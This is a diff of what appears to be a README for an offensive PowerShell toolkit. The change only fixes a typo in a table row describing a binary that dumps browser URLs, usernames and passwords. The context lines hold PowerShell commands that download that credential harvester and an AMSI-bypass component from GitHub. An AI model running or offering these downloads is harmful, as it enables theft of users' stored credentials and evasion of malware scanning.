@@ -29,7 +29,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps majot browsers|
+|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
